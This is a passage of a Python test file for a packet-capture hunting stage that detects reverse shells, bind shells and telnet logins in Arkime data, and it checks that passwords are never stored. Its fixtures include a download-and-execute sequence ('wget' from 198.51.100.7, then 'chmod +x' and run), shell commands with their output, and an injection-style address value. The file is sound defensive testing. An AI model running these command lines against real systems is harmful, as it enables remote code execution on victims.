    assert (streams["candidates"], streams["connections"], streams["shaped"], streams["judged"]) == (1, 1, 1, 1)
    found = _found(repo)
    assert len(found) == 1 and found[0]["lane"] == "high"
    cites = rm._citations(repo, found[0])
    assert len(cites) == 1 and cites[0]["status"] == "retained"
    event = repo.events_by_ids(found[0]["event_ids"])[0]
    raw = repo.raw_records(event["raw_ids"])[0]
    dumped = json.dumps(raw, default=str)
    for text in ("www-data", "uid=33", REVERSE[1][1].hex()[:40]):
        assert text not in dumped                                 # digests and offsets only
    typed = TypedEvent.model_validate(event["event"])
    assert typed.host is None and typed.get("observer.name") == "inetfw"
    assert typed.entities() == [("ip", VICTIM[0], "src"), ("ip", ATTACKER[0], "dst")]
    cell = _cell(repo)
    assert cell["state"] == "matched" and cell["target"] == f"arkime-pcap:{TARGET}"
    assert cell["detail"]["selection"] == hp.stream_selection(True, True)
    assert not list((tmp_path / "stage").glob("romulus-pcap-*"))


def test_a_telnet_login_is_judged_and_the_password_is_never_kept(tmp_path, monkeypatch):
    server = (WEB[0], 23)
    key = pk.stream_key(*OPERATOR, *server)
    doc = sdoc("241118-TELNET000001", OPERATOR, server, protocol=("tcp", "telnet"), cpk=6, spk=6,
               last=T0 + timedelta(seconds=10))
    repo, summary = _stage(tmp_path, monkeypatch, [doc], {key: conversation(TELNET, client=OPERATOR, server=server)})
    found = _found(repo)
    assert len(found) == 1 and found[0]["lane"] == "lead" and summary["status"] == "complete"
    event = repo.events_by_ids(found[0]["event_ids"])[0]
    stored = json.dumps([event, repo.raw_records(event["raw_ids"]), found[0]], default=str)
    assert "s3cret" not in stored and b"s3cret".hex() not in stored


def test_retrieval_intent_is_typed_and_a_superset_of_what_the_shape_test_accepts(tmp_path, monkeypatch):
    intents = []
    quiet = sdoc("241118-QUIET0000001", VICTIM, ATTACKER, cpk=2, spk=3, cb=0, sb=12)   # a quiet saved segment
    docs = [REV_DOC, quiet, sdoc("241118-LOGIN0000001", OPERATOR, (WEB[0], 23), protocol=("tcp", "telnet"), cpk=5,
                                 spk=5)]
    _stage(tmp_path, monkeypatch, docs, REV_ROWS, intents=intents)
    intent = next(i for i in intents if i.purpose == hp.STREAM_PURPOSE)
    compile_es(intent, _contract())                                # it compiles through the field contract
    assert [(p.field, p.op) for p in intent.filters] == [("lastPacket", "gte")]
    groups = [[(p.field, p.op, p.value) for p in g] for g in intent.any_of]
    assert groups[0] == [("protocol", "eq", "tcp"), ("protocolCnt", "eq", 1), ("client.bytes", "gte", 1)]
    assert groups[3] == [("protocol", "in", hp.REMOTE_LOGIN_PROTOCOLS), ("server.bytes", "gte", 1)]

    def holds(doc, p):
        value = doc["_source"]
        for part in {"protocolCnt": ["protocolCnt"]}.get(p.field, p.field.split(".")):
            value = value.get(part) if isinstance(value, dict) else None
        values = value if isinstance(value, list) else [value]
        return {"eq": lambda: p.value in values, "in": lambda: bool(set(values) & set(p.value)),
                "gte": lambda: any(v is not None and v >= p.value for v in values)}[p.op]()

    # every document of every connection the local shape test accepts is retrieved (lastPacket is in the window)
    for doc in docs:
        verdict, _login = hp._shape([d for d in docs if hp._logical(d) == hp._logical(doc)])
        if verdict == "shaped":
            assert any(all(holds(doc, p) for p in g) for g in intent.any_of), doc["_id"]


def test_without_protocol_count_the_selection_falls_back_and_says_so(tmp_path, monkeypatch):
    intents = []
    repo, _summary = _stage(tmp_path, monkeypatch, [REV_DOC], REV_ROWS, contract=_contract(protocolCnt=None),
                           intents=intents)
    intent = next(i for i in intents if i.purpose == hp.STREAM_PURPOSE)
    assert ("source.packets", "gte", hp.STREAM_MIN_PACKETS) in [(p.field, p.op, p.value) for p in intent.any_of[0]]
    assert _cell(repo)["detail"]["selection"] == hp.stream_selection(True, False)
    assert "a quiet saved document of a long connection is not selected" in hp.stream_selection(True, False)


def test_a_target_without_the_selection_fields_is_not_applicable_with_the_reason(tmp_path, monkeypatch):
    intents = []
    repo, summary = _stage(tmp_path, monkeypatch, [REV_DOC], REV_ROWS, contract=_contract(**{"client.bytes": None}),
                           intents=intents)
    assert not [i for i in intents if i.purpose == hp.STREAM_PURPOSE]
    cell = _cell(repo)
    assert cell["state"] == "not_applicable_no_events" and "client.bytes" in cell["detail"]["reason"]
    assert summary["streams"][TARGET]["status"] == "not_applicable" and summary["status"] == "complete"


@pytest.mark.parametrize("doc, shaped", [
    (sdoc("241118-SHORT0000001", VICTIM, ATTACKER, last=T0 - timedelta(seconds=40)), False),      # 20 s long
    (sdoc("241118-FEWPKT000001", VICTIM, ATTACKER, cpk=10), False),
    (sdoc("241118-BULK00000001", VICTIM, ATTACKER, sb=40 * 1400), False),                       # bulk transfer
    (sdoc("241118-ONEWAY000001", VICTIM, ATTACKER, cb=0), False),
    (sdoc("241118-HTTP00000001", VICTIM, ATTACKER, protocol=("tcp", "http")), False),
    (sdoc("241118-KAFKA0000001", OPERATOR, ("10.0.0.20", 9092)), True),     # a parser gap is not excluded by port
    (sdoc("241118-LOGIN0000001", OPERATOR, (WEB[0], 23), protocol=("tcp", "telnet"), cpk=4, spk=4,
          last=T0 - timedelta(seconds=55)), True),
])
def test_the_interactive_shape(doc, shaped):
    assert (hp._shape([doc])[0] == "shaped") is shaped


def test_the_shape_spans_all_documents_of_a_connection():
    first = sdoc("241118-SEGA00000001", VICTIM, ATTACKER, cpk=12, spk=12, last=T0)
    second = sdoc("241118-SEGB00000001", VICTIM, ATTACKER, cpk=12, spk=12, last=T0 + timedelta(minutes=12))
    assert hp._shape([first])[0] == "not_shaped" and hp._shape([first, second])[0] == "shaped"


def _partial(repo, summary, fragment):
    assert summary["status"] == "partial" and summary["finished"]
    assert any(fragment in r for r in summary["partial_reasons"]), summary["partial_reasons"]
    assert _cell(repo)["state"] in ("positive_only_partial", "match_on_partial")


def test_a_truncated_capture_still_reports_the_shell_but_is_partial(tmp_path, monkeypatch):
    repo, summary = _stage(tmp_path, monkeypatch, [REV_DOC], REV_ROWS, truncated={KEY})
    _partial(repo, summary, "judged on a capped download or a capture cut short")
    assert _cell(repo)["state"] == "match_on_partial" and len(_found(repo)) == 1
    assert summary["streams"][TARGET]["unexamined_sessions"] == {"capture_incomplete": [REV_DOC["_id"]]}
    event = TypedEvent.model_validate(repo.events_by_ids(_found(repo)[0]["event_ids"])[0]["event"])
    assert "the download was capped or the capture ends mid-packet" in event.get("stream.limits")


def test_a_capped_download_is_partial(tmp_path, monkeypatch):
    repo, summary = _stage(tmp_path, monkeypatch, [REV_DOC], REV_ROWS, packets=_Packets(capped={REV_DOC["_id"]}))
    _partial(repo, summary, "judged on a capped download")


def test_the_per_direction_byte_cap_is_partial(tmp_path, monkeypatch):
    monkeypatch.setattr(hp, "STREAM_DIRECTION_BYTES", 40)
    repo, summary = _stage(tmp_path, monkeypatch, [REV_DOC], REV_ROWS)
    _partial(repo, summary, "first bytes of a direction only")


def test_holes_in_the_capture_are_partial(tmp_path, monkeypatch):
    rows = conversation(REVERSE)
    del rows[3]
    repo, summary = _stage(tmp_path, monkeypatch, [REV_DOC], {KEY: rows})
    _partial(repo, summary, "with holes")


def test_no_payload_rebuilt_is_partial_not_a_negative(tmp_path, monkeypatch):
    repo, summary = _stage(tmp_path, monkeypatch, [REV_DOC], {})
    _partial(repo, summary, "no payload was rebuilt although Arkime counted some")
    assert _cell(repo)["state"] == "positive_only_partial"


def test_missing_shape_fields_are_partial_and_listed(tmp_path, monkeypatch):
    doc = sdoc("241118-NOBYTES00001", VICTIM, ATTACKER)
    del doc["_source"]["client"]
    repo, summary = _stage(tmp_path, monkeypatch, [doc], REV_ROWS)
    _partial(repo, summary, "shape cannot be computed")
    assert _cell(repo)["detail"]["unexamined_sessions"] == {"shape_unknown": [doc["_id"]]}


def test_hostile_session_fields_never_reach_tshark(tmp_path, monkeypatch):
    doc = sdoc("241118-INJECT000001", ("10.0.0.1 || 1==1", 50000), ATTACKER)
    calls, packets = [], _Packets()
    repo, summary = _stage(tmp_path, monkeypatch, [doc], {}, tshark_calls=calls, packets=packets)
    assert calls == [] and packets.calls == []
    _partial(repo, summary, "invalid connection fields")


def test_a_refused_download_is_partial(tmp_path, monkeypatch):
    repo, summary = _stage(tmp_path, monkeypatch, [REV_DOC], REV_ROWS, packets=_Packets(error="HTTP 403"))
    _partial(repo, summary, "the fetch or TShark run failed")


def test_the_connection_cap_judges_external_endpoints_first_and_lists_the_rest(tmp_path, monkeypatch):
    monkeypatch.setattr(hp, "STREAM_MAX_CONNECTIONS", 1)
    internal = sdoc("241118-INTERNAL0001", OPERATOR, WEB, first=T0 - timedelta(minutes=30))
    calls = []
    repo, summary = _stage(tmp_path, monkeypatch, [internal, REV_DOC], {**REV_ROWS, BIND_KEY: conversation(BIND)},
                           tshark_calls=calls)
    assert calls == [KEY]                                         # the external connection was judged first
    _partial(repo, summary, "beyond the per-target connection cap or packet byte budget")
    assert summary["streams"][TARGET]["unexamined_sessions"] == {"unjudged_over_cap": [internal["_id"]]}
    assert _cell(repo)["state"] == "match_on_partial"


def test_the_packet_budget_bounds_every_fetch(tmp_path, monkeypatch):
    monkeypatch.setattr(hp, "STREAM_BUDGET_BYTES", len(PCAP) + 10)
    docs = [REV_DOC, sdoc("241118-SECOND000001", OPERATOR, WEB)]
    packets = _Packets()
    _repo, summary = _stage(tmp_path, monkeypatch, docs, REV_ROWS, packets=packets)
    assert [max_bytes for _ids, max_bytes in packets.calls] == [len(PCAP) + 10, 10]
    assert summary["streams"][TARGET]["fetched_bytes"] == 2 * len(PCAP)


def test_a_partial_selection_is_partial(tmp_path, monkeypatch):
    out = SearchOutcome(target=TARGET, fingerprint="f", started_at=T0, ended_at=T0, completeness=Completeness.partial,
                        reasons=["shard_failures"], total=1, total_relation="eq", returned=1, records=[REV_DOC])
    repo, summary = _stage(tmp_path, monkeypatch, [REV_DOC], REV_ROWS, outcome=out)
    _partial(repo, summary, "streams: candidate selection partial: shard_failures")


def test_indicators_outside_the_window_are_counted_and_a_boundary_indicator_is_inside(tmp_path, monkeypatch):
    first = analyze(conversation(REVERSE)).indicators[0].time
    edge = datetime.fromtimestamp(first, UTC)
    # every indicator at or after the window's end: not this hunt's (half-open window)
    repo, summary = _stage(tmp_path, monkeypatch, [REV_DOC], REV_ROWS,
                           window=Window(start=edge - timedelta(hours=1), end=edge))
    assert _found(repo) == [] and summary["streams"][TARGET]["outside_window"] == 1
    assert summary["status"] == "complete"
    # an indicator exactly at the window's start is inside it
    repo, _summary = _stage(tmp_path, monkeypatch, [REV_DOC], REV_ROWS,
                            window=Window(start=edge, end=edge + timedelta(hours=1)))
    assert len(_found(repo)) == 1
    event = TypedEvent.model_validate(repo.events_by_ids(_found(repo)[0]["event_ids"])[0]["event"])
    assert event.ts == edge


def test_the_stage_is_deterministic(tmp_path, monkeypatch):
    docs = [REV_DOC, sdoc("241118-BIND00000001", OPERATOR, WEB)]
    rows = {**REV_ROWS, BIND_KEY: conversation(BIND, client=OPERATOR, server=WEB)}
    runs = []
    for i in range(2):
        repo, _summary = _stage(tmp_path / str(i), monkeypatch, docs, rows)
        runs.append(sorted((c["claim"], tuple(c["event_ids"]), c["lane"]) for c in _found(repo)))
    assert runs[0] == runs[1] and len(runs[0]) == 2


def test_segments_of_one_connection_are_fetched_in_order_and_judged_once(tmp_path, monkeypatch):
    early = sdoc("241118-SEGEARLY0001", VICTIM, ATTACKER, last=T0 + timedelta(minutes=5))
    late = sdoc("241118-SEGLATE00001", VICTIM, ATTACKER, last=T0 + timedelta(minutes=20))
    packets = _Packets()
    repo, summary = _stage(tmp_path, monkeypatch, [late, early], REV_ROWS, packets=packets)
    assert [ids for ids, _b in packets.calls] == [[early["_id"]], [late["_id"]]]
    assert summary["streams"][TARGET]["connections"] == 1 and len(_found(repo)) == 1
    event = TypedEvent.model_validate(repo.events_by_ids(_found(repo)[0]["event_ids"])[0]["event"])
    assert event.get("arkime.session_ids") == [early["_id"], late["_id"]]


# ---- review follow-ups: window start, typed secrets, hostile negotiation, opener, single indicators -------------

def test_a_shell_first_seen_before_the_window_and_active_inside_it_is_reported(tmp_path, monkeypatch):
    more = [("s2c", b"id\n"), ("c2s", b"uid=33(www-data) gid=33(www-data)\n")] * 40
    rows = {KEY: conversation(REVERSE + more, syn="client")}
    indicators_end = T0 + timedelta(seconds=0.5 * 7)
    window = Window(start=indicators_end + timedelta(seconds=1), end=T0 + timedelta(hours=1))
    repo, summary = _stage(tmp_path, monkeypatch, [REV_DOC], rows, window=window)
    found = _found(repo)
    assert len(found) == 1 and summary["streams"][TARGET]["outside_window"] == 0
    event = TypedEvent.model_validate(repo.events_by_ids(found[0]["event_ids"])[0]["event"])
    assert window.start <= event.ts < window.end
    assert "first seen before the hunt window" in " ".join(event.get("stream.notes"))


def test_a_password_typed_at_a_prompt_leaves_no_digest_anywhere():
    secret = b"Hunter2!"
    turns = [("s2c", b"bob@web01:~$ "), ("c2s", b"su -\n"),
             ("s2c", b"Password: su: Authentication failure\nbob@web01:~$ "),
             ("c2s", secret + b"\n"), ("s2c", secret + b": command not found\nbob@web01:~$ "), ("c2s", b"exit\n")]
    a = analyze(conversation(turns, client=OPERATOR, server=WEB), pk.stream_key(*OPERATOR, *WEB))
    assert "shell_error" in a.kinds and "prompt" in a.kinds
    claim = rule(stream_event(a, client=OPERATOR, server=WEB))[0].claim
    stored = json.dumps([i.as_dict() for i in a.indicators]) + claim
    for leaked in (hashlib.sha256(secret).hexdigest(), hashlib.sha256(secret + b": command not found").hexdigest()):
        assert leaked not in stored and leaked[:16] not in stored
    assert "command_sha256" not in stored


def test_hostile_telnet_negotiation_cannot_stall_the_analysis():
    import time
    hostile = b"\xff\xfa" * 60000 + b"\n"
    turns = [("c2s", hostile), ("s2c", hostile), ("c2s", b"\xff\xfa" * 60000)]
    started = time.monotonic()
    a = analyze(conversation(turns, client=OPERATOR, server=WEB), pk.stream_key(*OPERATOR, *WEB))
    assert a.kinds == [] and time.monotonic() - started < 5


def test_the_opener_comes_from_a_captured_syn_only():
    key = pk.stream_key(*OPERATOR, *WEB)
    syn = pk.reassemble_tcp(conversation(BIND, client=OPERATOR, server=WEB, syn="client"), key, 10 ** 6)
    assert syn.opened_by == "client"
    assert pk.reassemble_tcp(conversation(BIND, client=OPERATOR, server=WEB), key, 10 ** 6).opened_by is None
    newer = conversation(BIND, client=OPERATOR, server=WEB, syn="server")
    newer[0]["tcp.flags.syn"], newer[0]["tcp.flags.ack"] = ["True"], ["False"]       # newer TShark booleans
    assert pk.reassemble_tcp(newer, key, 10 ** 6).opened_by == "server"


def test_without_a_captured_syn_an_internal_reverse_shell_is_a_lead(tmp_path, monkeypatch):
    doc = sdoc("241118-INTREV000001", OPERATOR, WEB)
    rows = {BIND_KEY: conversation(REVERSE, client=OPERATOR, server=WEB)}
    repo, _summary = _stage(tmp_path, monkeypatch, [doc], rows)
    assert [c["lane"] for c in _found(repo)] == ["lead"]


def test_single_indicator_connections_are_named_not_published(tmp_path, monkeypatch):
    rows = {KEY: conversation(HARD_NEGATIVES["single_id"], syn="client")}
    repo, summary = _stage(tmp_path, monkeypatch, [REV_DOC], rows)
    assert _found(repo) == [] and summary["status"] == "complete"
    assert _cell(repo)["detail"]["single_indicator_sessions"] == [REV_DOC["_id"]]


def test_a_keepalive_byte_is_not_a_conflicting_retransmission():
    rows = conversation([("c2s", b"id\n")], client=OPERATOR, server=WEB)
    keepalive = json.loads(json.dumps(rows[0]))
    keepalive.update({"frame.number": ["5"], "tcp.seq": ["3"], "tcp.len": ["1"], "tcp.payload": ["00"]})
    streams = pk.reassemble_tcp(rows + [keepalive], pk.stream_key(*OPERATOR, *WEB), 10 ** 6)
    assert streams.conflicts["c2s"] == 0 and streams.data["c2s"] == b"id\n"


def test_rows_with_unreadable_addresses_make_the_connection_partial(tmp_path, monkeypatch):
    rows = conversation(REVERSE, syn="client")
    stray = json.loads(json.dumps(rows[1]))
    stray["ip.src"] = ["not-an-address"]
    repo, summary = _stage(tmp_path, monkeypatch, [REV_DOC], {KEY: [*rows, stray]})
    _partial(repo, summary, "with holes")



# ---- a strong indicator stands alone (as a lead) --------------------------------------------------------------

# `/bin/sh` sent back over tcp/4444: its start-up message, then commands with no recognised output and no prompt.
BANNER_ONLY = [("c2s", b"/bin/sh: 0: can't access tty; job control turned off\n"), ("s2c", b"cd /tmp\n"),
               ("c2s", b"\n"), ("s2c", b"wget -q http://198.51.100.7/a\n"), ("c2s", b"\n"),
               ("s2c", b"chmod +x a; ./a &\n"), ("c2s", b"[1] 4242\n")]


def test_a_lone_shell_banner_in_a_conversation_is_a_low_confidence_lead():
    a = _analysis(BANNER_ONLY, VICTIM, ATTACKER)
    assert a.kinds == ["banner"] and a.side == "client"
    m = rule(stream_event(a, opened_by="client"))
    assert len(m) == 1 and m[0].proposed_lane == "lead" and m[0].confidence == "low"
    assert "a single indicator was seen: a shell start-up message" in m[0].claim
    assert "is in one respect consistent with an interactive command shell" in m[0].claim


def test_a_lone_command_output_is_a_medium_confidence_lead_and_a_lone_prompt_is_nothing():
    turns = [("s2c", b"id\n"), ("c2s", b"uid=33(www-data) gid=33(www-data)\n"), ("s2c", b"cd /tmp\n"),
             ("c2s", b"\n"), ("s2c", b"touch x\n"), ("c2s", b"\n")]
    a = _analysis(turns, VICTIM, ATTACKER)
    assert a.kinds == ["output:id"]
    m = rule(stream_event(a, opened_by="client"))
    assert [(x.proposed_lane, x.confidence) for x in m] == [("lead", "medium")]
    prompts = []
    for _ in range(4):
        prompts += [("s2c", b"www-data@web01:/tmp$ "), ("c2s", b"cd /tmp\n")]
    lone = _analysis(prompts, OPERATOR, WEB)
    assert lone.kinds == ["prompt"] and rule(stream_event(lone, client=OPERATOR, server=WEB)) == []


def test_a_lone_login_dialogue_is_nothing():
    turns = [("s2c", b"web01 login: "), ("c2s", b"admin\r\n"), ("s2c", b"Password: "), ("c2s", b"pw\r\n"),
             ("s2c", b"Login incorrect\r\n"), ("c2s", b"\r\n")]
    a = _analysis(turns, OPERATOR, WEB)
    assert a.kinds == ["login_dialogue"] and rule(stream_event(a, client=OPERATOR, server=WEB)) == []


def test_an_unanswered_banner_is_not_an_indicator():
    a = _analysis([("c2s", b"bash: no job control in this shell\n")], VICTIM, ATTACKER)
    assert a.kinds == []


def test_the_stage_publishes_a_lone_banner_as_a_lead(tmp_path, monkeypatch):
    repo, summary = _stage(tmp_path, monkeypatch, [REV_DOC], {KEY: conversation(BANNER_ONLY, syn="client")})
    assert [(c["lane"], c["confidence"]) for c in _found(repo)] == [("lead", "low")]
    assert summary["streams"][TARGET]["single_indicator"] == 0
